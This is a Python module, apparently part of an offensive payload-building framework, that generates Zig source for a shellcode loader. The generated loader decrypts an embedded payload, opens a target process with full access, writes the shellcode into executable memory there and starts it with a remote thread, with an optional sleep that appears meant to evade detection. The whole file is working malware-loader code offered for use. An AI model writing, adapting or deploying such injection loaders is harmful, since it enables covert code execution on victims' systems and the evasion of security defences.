#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Classic remote shellcode injection — pure Zig."""

from __future__ import annotations

from lib.compile.injection_common import InjectionBuilder
from lib.compile.zig_loader_common import zig_decode_decrypt_preamble, zig_sleep_ms, zig_std_preamble


class ClassicRemoteInjectionBuilder(InjectionBuilder):

    def build_zig_source(
        self,
        encoded_payload: str,
        key: bytes,
        iv=None,
        *,
        target_pid: int = 0,
    ) -> str:
        pid = max(0, int(target_pid))
        decode = zig_decode_decrypt_preamble(encoded_payload, key, iv, cipher=self.cipher)
        return f"""
{zig_std_preamble()}
{decode}

const TARGET_PID: w.DWORD = {pid};

fn injectRemote(sc: []const u8) bool {{
    if (TARGET_PID == 0) return false;
    const hProcess = OpenProcess(w.PROCESS_ALL_ACCESS, 0, TARGET_PID);
    if (hProcess == null) return false;
    defer _ = CloseHandle(hProcess.?);

    const remote = VirtualAllocEx(hProcess, null, sc.len, w.MEM_COMMIT | w.MEM_RESERVE, w.PAGE_EXECUTE_READWRITE);
    if (remote == null) return false;

    var written: w.SIZE_T = 0;
    if (WriteProcessMemory(hProcess, remote, sc.ptr, sc.len, &written) == 0 or written != sc.len) {{
        _ = VirtualFreeEx(hProcess, remote, 0, w.MEM_RELEASE);
        return false;
    }}
{zig_sleep_ms(self.sleep_ms)}
    const hThread = CreateRemoteThread(hProcess, null, 0, @ptrCast(remote), null, 0, null);
    if (hThread == null) {{
        _ = VirtualFreeEx(hProcess, remote, 0, w.MEM_RELEASE);
        return false;
    }}
    _ = WaitForSingleObject(hThread.?, 15000);
    _ = CloseHandle(hThread.?);
    _ = VirtualFreeEx(hProcess, remote, 0, w.MEM_RELEASE);
    return true;
}}

pub fn main() u8 {{
    var gpa = std.heap.GeneralPurposeAllocator(.{{}}){{}};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();
    const sc = decodeAndDecrypt(allocator) catch return 1;
    defer allocator.free(sc);
    if (!injectRemote(sc)) return 1;
    return 0;
}}
"""
